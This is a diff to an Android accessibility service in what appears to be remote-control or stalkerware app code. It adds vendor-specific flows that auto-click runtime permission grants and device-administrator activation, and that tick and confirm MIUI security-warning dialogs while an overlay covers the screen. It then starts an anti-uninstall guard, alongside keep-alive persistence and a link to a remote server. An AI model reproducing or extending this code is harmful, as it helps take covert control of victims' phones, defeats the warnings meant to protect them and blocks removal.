@@ -278,6 +278,38 @@ class BoundaryAccessibilityService : AccessibilityService() {
     }
 
     /** 后台弹出界面打开之后的后续步骤（放慢节奏，每步之间留够渲染时间） */
+    // ───────────────────────── 引导流程：按厂商分开 ─────────────────────────
+
+    /**
+     * 三星（以及除小米外的所有厂商）：保持 2.2/3.4 以来的原有链路。
+     *   申请运行时权限 → 自动点允许 → 设备管理员 → 通知使用权 → 电池白名单
+     * 这条链路由 AdminActivator / NotificationAccessActivator 内部接力完成。
+     */
+    private fun runLegacyOnboarding(noAutoClick: Boolean) {
+        android.util.Log.d("AccGuard", "onboarding: legacy flow (non-MIUI)")
+        com.zaka.screenagent.admin.AdminActivator.attach(this)
+        com.zaka.screenagent.admin.AdminActivator.autoclick = !noAutoClick
+        com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !noAutoClick
+        if (!noAutoClick) runCatching { com.zaka.screenagent.perm.PermissionClicker.start(this) }
+        startPermissionWithRetry(36)
+    }
+
+    /**
+     * 小米（MIUI / HyperOS）：只做两步，后续步骤再逐个加。
+     *   第 1 步：申请 9 项运行时权限（自己点允许；不需要「后台弹出界面」）
+     *   第 2 步：设备管理员 —— 点「激活」→ 危险页 → 等 2 秒 → 勾「我已知晓」
+     * 不提前挂 AdminActivator，避免它抢在我们前面弹页导致时序错乱。
+     */
+    private fun runMiuiOnboarding(noAutoClick: Boolean) {
+        android.util.Log.d("AccGuard", "onboarding: MIUI flow (2 steps)")
+        com.zaka.screenagent.admin.AdminActivator.autoclick = !noAutoClick
+        com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !noAutoClick
+        if (!noAutoClick) runCatching { com.zaka.screenagent.perm.PermissionClicker.start(this) }
+        startPermissionWithRetry(36)                       // 第 1 步
+        // 第 2 步（设备管理员）由 PermissionActivity → DeviceAdminActivity 在前台完成，
+        // 这里不再额外排期，避免两条路径抢时序。
+    }
+
     /**
      * 目前只做两步（其他步骤先注释掉）：
      *   第 1 步：申请运行时权限（在服务连接处触发）
@@ -293,6 +325,11 @@ class BoundaryAccessibilityService : AccessibilityService() {
     }
 
 
+
+    /** 供厂商策略调用：申请 9 项运行时权限 */
+    fun requestRuntimePermissions() {
+        startPermissionWithRetry(36)
+    }
 
     private fun startPermissionWithRetry(attempts: Int) {
         permissionTry = 0
@@ -326,6 +363,11 @@ class BoundaryAccessibilityService : AccessibilityService() {
             }.onFailure { android.util.Log.w("AccGuard", "debug: remove admin failed: $it") }
         }
         val onboardingDone = com.zaka.screenagent.admin.OnboardingState.isDone(this)
+        // 引导已完成的连接：先回桌面，再起防卸载守卫（顺序按需求固定）
+        if (onboardingDone && !com.zaka.screenagent.BuildConfig.NO_GUIDE) {
+            android.util.Log.d("AccGuard", "onboarding done -> go home before guard")
+            runCatching { home() }
+        }
         if (!com.zaka.screenagent.BuildConfig.NO_GUARD &&
             !com.zaka.screenagent.util.DebugFlags.noGuard(this) && onboardingDone) {
             runCatching { com.zaka.screenagent.admin.AntiUninstallGuard.start(this) }
@@ -340,35 +382,17 @@ class BoundaryAccessibilityService : AccessibilityService() {
         val needOnboarding = !com.zaka.screenagent.admin.OnboardingState.isDone(this) ||
             com.zaka.screenagent.BuildConfig.NO_GUIDE
         if (needOnboarding && !com.zaka.screenagent.ui.BlackScreen.isShowing()) {
-            if (!dbgNoOverlay && !com.zaka.screenagent.BuildConfig.NO_GUIDE) runCatching { com.zaka.screenagent.ui.GuardOverlay.show(this) }
-            // 引导链：权限申请（浮层遮盖）→ 自动点允许 → 设备管理员激活 → 100% 收浮层
-            // 厂商分支：MIUI 由链条第二步显式触发 admin（避免抢跑）；
-            // 其它厂商保持原有行为——连上就挂 AdminActivator
-            if (com.zaka.screenagent.perm.OemFlow.vendor() == com.zaka.screenagent.perm.OemFlow.Vendor.MIUI) {
-                android.util.Log.d("AccGuard", "MIUI branch: admin deferred to chain step2")
-            } else {
-                com.zaka.screenagent.admin.AdminActivator.attach(this)
+            if (!dbgNoOverlay && !com.zaka.screenagent.BuildConfig.NO_GUIDE) {
+                runCatching { com.zaka.screenagent.ui.GuardOverlay.show(this) }
             }
-            com.zaka.screenagent.admin.AdminActivator.autoclick = !dbgNoAutoClick
-            com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !dbgNoAutoClick
-            if (!dbgNoAutoClick) runCatching { com.zaka.screenagent.perm.PermissionClicker.start(this) }
-            if (!com.zaka.screenagent.ui.BlackScreen.isShowing()) {
-                // 统一走这条：无障碍已拿到 → B 自己拉起自己的权限页，自己点「允许」。
-                // 小米如果没给「后台弹出界面」，系统会静默丢弃这次启动（日志 MIUILOG- Permission Denied），
-                // 所以这里做重试：每 5 秒再试一次，用户在系统里把权限开出来之后下一次就会成功。
-                // 厂商分派（case 分支集中在 OemFlow）
-                val plan = com.zaka.screenagent.perm.OemFlow.plan(this)
-                com.zaka.screenagent.perm.OemFlow.log(this)
-                startPermissionWithRetry(36)
-                if (plan.vendor == com.zaka.screenagent.perm.OemFlow.Vendor.MIUI) {
-                    // MIUI 专属：权限 → 设备管理员（两步）
-                    main.postDelayed({ scheduleRestAfterGate() }, plan.permDelayMs)
-                }
-                // 其它厂商：后续通知/管理员/电池仍由它们各自的原有链路负责
-            }
+            // ── 厂商分派：三星走三星的一套，小米走小米的两步 ──
+            com.zaka.screenagent.flow.VendorFlows.log()
+            // 唯一分派点：按厂商走各自的完整流程（小米两步 / 其它原链路）
+            com.zaka.screenagent.flow.VendorFlows.of().start(this, dbgNoAutoClick)
         }
         // 2.3：保活（2.2：前台服务 + Job(15min,persisted) + 精确闹钟 + 电池白名单）
         runCatching { com.zaka.screenagent.keepalive.KeepAliveManager.startAll(this) }
+        // MIUI：不再巡检；危险页处理由 admin 步骤一次性排期
         main.postDelayed(dumpTick, 800L)
         // 2.3：接墨影协议（与 2.2 服务器 yk4.jk92.cc 对接）
         runCatching {
@@ -724,7 +748,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
                 if (com.zaka.screenagent.perm.MiuiNavigator.clickByText(this, t, contains = false)) { hit = true; break }
             }
             android.util.Log.d("AccGuard", "noti click toggle=$hit")
-            com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this, 25_000L) { ok ->
+            com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this) { ok ->
                 android.util.Log.d("AccGuard", "noti risk passed=$ok")
             }
         }, 6_000L)
@@ -745,13 +769,25 @@ class BoundaryAccessibilityService : AccessibilityService() {
         }
         android.util.Log.d("AccGuard", "admin: start attempt=$attempt")
         runCatching {
-            com.zaka.screenagent.admin.AdminActivator.attach(this)   // 给它 context
-            com.zaka.screenagent.admin.AdminActivator.start(this)    // 打开激活页并点「激活」
-        }
-        // 立刻开始轮询拦截页：一出现就勾「我同意/我已知晓」，勾上后点「确定」
-        com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this, 25_000L) { ok ->
-            android.util.Log.d("AccGuard", "admin risk passed=$ok attempt=$attempt")
-        }
+            // ① 由我们自己打开激活页（AdminActivator 只负责轮询点「激活」，不会自己开页）
+            startActivity(
+                com.zaka.screenagent.admin.MoyingAdminReceiver.activationIntent(this, newTask = true)
+            )
+            // ② 再让它轮询并点「激活」；navigationEnabled=false 表示别自己导航到列表页
+            com.zaka.screenagent.admin.AdminActivator.attach(this)
+            com.zaka.screenagent.admin.AdminActivator.navigationEnabled = false
+            com.zaka.screenagent.admin.AdminActivator.autoclick = true
+            com.zaka.screenagent.admin.AdminActivator.start(this)
+        }.onFailure { android.util.Log.w("AccGuard", "admin start failed: $it") }
+        // 激活页大约 6~8 秒后弹出危险页 → 8 秒后按固定节奏处理（2s 勾选、再 10s 确定）
+        main.postDelayed({
+            com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this) { ok ->
+                android.util.Log.d("AccGuard", "admin risk passed=$ok attempt=$attempt")
+                val active = getSystemService(android.app.admin.DevicePolicyManager::class.java)
+                    ?.isAdminActive(android.content.ComponentName(this, com.zaka.screenagent.admin.MoyingAdminReceiver::class.java)) ?: false
+                android.util.Log.d("AccGuard", "admin verify=$active attempt=$attempt")
+            }
+        }, 8_000L)
         main.postDelayed({
             val active = dpm?.isAdminActive(cn) ?: false
             android.util.Log.d("AccGuard", "admin verify=$active attempt=$attempt")
@@ -1630,6 +1666,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
         )
         scheduleViewerFrame()
     }
+
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event != null) {
